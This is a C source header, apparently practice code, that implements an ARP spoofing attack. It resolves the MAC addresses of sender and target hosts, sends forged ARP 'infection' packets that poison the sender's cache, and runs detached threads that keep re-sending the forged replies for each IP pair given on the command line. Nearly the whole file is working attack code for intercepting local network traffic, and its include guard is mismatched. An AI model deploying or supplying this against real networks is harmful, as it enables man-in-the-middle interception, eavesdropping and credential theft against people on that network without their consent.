#include "ethernethelper.h"
#include "arphelper.h"
#include "iphelper.h"
#include "tcphelper.h"
#include "udphelper.h"
#include "packetmaker.h"
#include "packetAnalyzer.h" 

#ifndef ARPSOOP_H
#define ARPSOOP_Hd


void printipSets(int n){
	printf("\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~`\n");
  printf("n = %d\n", n); 
  printDecValue("sender ip : ", ipsets[n].senderIp, 4, '.');
  printHexValue("sender mac : ", ipsets[n].senderMac, 6, ';');
  printDecValue("target ip : ", ipsets[n].targetIp, 4, '.');
  printHexValue("target mac : ", ipsets[n].targetMac, 6, ':');
  printf("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
	fflush(stdout) ; 
}

void printSignal(){
  for(int i =0 ; i < sessionSize; i++)
    printf("[%d] = %d \t", i, threadSignal[i]);
	fflush(stdout);
}

void tryingInfection(int num){
	pthread_mutex_lock(&mutex);
	printf("\tget mutex\n"); 
	fflush(stdout); 
	sendArp(handle, mac, ipsets[num].targetIp, ipsets[num].senderMac, ipsets[num].senderIp, 0); 
	pthread_mutex_unlock(&mutex); 
	printf("\n\t arp infection packet send \n"); 
	fflush(stdout); 
	return; 
}

void* arpSpoofer(void* idx){
  //struct ip_set* ipsets = (struct ip_set*) ips;
  int num = *(int*)idx;
	printipSets(num); 
	printf("!!! child number is %d !!!\n", num); 
	printf("!!! child thread start !!!\n");
	while(1){
		if(threadSignal[num] == 0){ 
			continue; 
		}
		tryingInfection(num); 
		pthread_mutex_lock(&mutex);
		printf("arpSpoo, get lock\n"); 
		threadSignal[num] = 0; 
		pthread_mutex_unlock(&mutex); 
		printf("arpSpoo, free the lock\n"); 
		usleep(500); 
	}
}

bool getOtherMac(uint8_t* targetIp, uint8_t* targetMac){
	for(int j= 0; j < 3; j++){
    uint8_t tmp[6] = {0, };
    pthread_mutex_lock(&mutex);
    sendArp(handle, mac, ip, tmp, targetIp, 1);
    pthread_mutex_unlock(&mutex);
		
		for(int i= 0; i < 5; i++){
			struct pcap_pkthdr* header;
    	const u_char* packet;
			pthread_mutex_lock(&mutex);
			int res = pcap_next_ex(handle, &header, &packet);
			pthread_mutex_unlock(&mutex);
			if (res == 0) continue;
			if (res == -1 || res == -2) break;
			if (isArpReply(targetMac, targetIp, header, packet)){
				printHexValue("\n[+] find sender mac : ", targetMac, 6, ':');
				return true; 
			}
		}
	}
	return false; 
}
int sessionSetting(int argc, char* argv[]){
  for(int i = 0; i <sessionSize; i++){
    printf("\n ==== session %d ====\n", i);
    struct ip_set* ips = &(ipsets[i]); 

    uint32_t sender_ip_temp = inet_addr(argv[(i+1)*2]);
    if(sender_ip_temp == INADDR_NONE){
      printf("ERROR::invalid ip address\n");
      return -1;
    }
    memcpy(ips->senderIp, &sender_ip_temp, 4);
    printDecValue("[+] sender ip : ", ips->senderIp, 4, '.');

    uint32_t target_ip_temp = inet_addr(argv[(i+1)*2+1]);
    if(target_ip_temp == INADDR_NONE) {
      printf("ERROR::invalid ip address\n");
      return -1;
    }
    memcpy(ips->targetIp, &target_ip_temp, 4);
    printDecValue("[+] target ip : ", ips->targetIp, 4, '.');

		getOtherMac(ips->senderIp, ips->senderMac); 
		getOtherMac(ips->targetIp, ips->targetMac); 

		printf("[+] trying %dst inspection  \n", i); 
		tryingInfection(i); 
	}

	for(int i= 0; i < sessionSize; i++) {
		pthread_t tid; 
		printf("create thread number : %d \n", sessionNumber[i]); 
		pthread_create(&tid, NULL, arpSpoofer, (void*)(sessionNumber+i)); 
		pthread_detach(tid); 
	}

  return 1;
}

 
#endif //ARPSOOP_H 
